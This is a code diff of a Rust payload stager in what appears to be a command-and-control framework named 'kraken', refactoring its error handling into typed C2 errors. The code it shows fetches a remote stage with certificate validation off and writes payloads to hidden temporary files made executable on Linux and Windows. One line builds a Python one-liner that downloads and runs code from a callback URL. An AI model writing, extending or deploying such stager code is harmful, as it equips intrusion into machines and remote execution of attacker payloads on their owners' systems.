@@ -50,28 +50,28 @@ impl PayloadStager {
         PayloadStager
     }
 
-    pub async fn fetch_stage(&self, config: &StagerConfig) -> Result<StagedPayload, String> {
+    pub async fn fetch_stage(&self, config: &StagerConfig) -> Result<StagedPayload, crate::C2Error> {
         let client = reqwest::Client::builder()
             .danger_accept_invalid_certs(true)
             .build()
-            .map_err(|e| format!("client build failed: {}", e))?;
+            .map_err(|e| crate::C2Error::Transport(format!("client build failed: {}", e)))?;
 
         let resp = client
             .get(&config.stage_url)
             .header("X-Stage-Key", &config.stage_key)
             .send()
             .await
-            .map_err(|e| format!("stage fetch failed: {}", e))?;
+            .map_err(|e| crate::C2Error::Transport(format!("stage fetch failed: {}", e)))?;
 
         let payload: StagedPayload = resp
             .json()
             .await
-            .map_err(|e| format!("stage parse failed: {}", e))?;
+            .map_err(|e| crate::C2Error::Transport(format!("stage parse failed: {}", e)))?;
 
         if config.verify_checksum {
             let computed = sha256(&payload.data);
             if computed != payload.checksum {
-                return Err(format!("Checksum mismatch: got {}, expected {}", computed, payload.checksum));
+                return Err(crate::C2Error::Protocol(format!("Checksum mismatch: got {}, expected {}", computed, payload.checksum)));
             }
         }
 
@@ -106,27 +106,27 @@ impl PayloadStager {
         format!("python3 -c \"import urllib.request;exec(urllib.request.urlopen('{}').read())\"", callback_url)
     }
 
-    pub fn execute_in_memory(payload: &StagedPayload) -> Result<String, String> {
+    pub fn execute_in_memory(payload: &StagedPayload) -> Result<String, crate::C2Error> {
         match payload.platform.as_str() {
             "linux" => {
                 let tmp = format!("/tmp/.kraken_{}", uuid::Uuid::new_v4());
                 std::fs::write(&tmp, &payload.data)
-                    .map_err(|e| format!("write failed: {}", e))?;
+                    .map_err(|e| crate::C2Error::Io(e))?;
                 #[cfg(unix)]
                 {
                     use std::os::unix::fs::PermissionsExt;
                     std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o755))
-                        .map_err(|e| format!("chmod failed: {}", e))?;
+                        .map_err(|e| crate::C2Error::Io(e))?;
                 }
                 Ok(format!("Payload written to {}", tmp))
             }
             "windows" => {
                 let tmp = format!("C:\\Windows\\Temp\\kraken_{}.exe", uuid::Uuid::new_v4());
                 std::fs::write(&tmp, &payload.data)
-                    .map_err(|e| format!("write failed: {}", e))?;
+                    .map_err(|e| crate::C2Error::Io(e))?;
                 Ok(format!("Payload written to {}", tmp))
             }
-            _ => Err(format!("Unsupported platform: {}", payload.platform)),
+            _ => Err(crate::C2Error::Protocol(format!("Unsupported platform: {}", payload.platform))),
         }
     }
 }
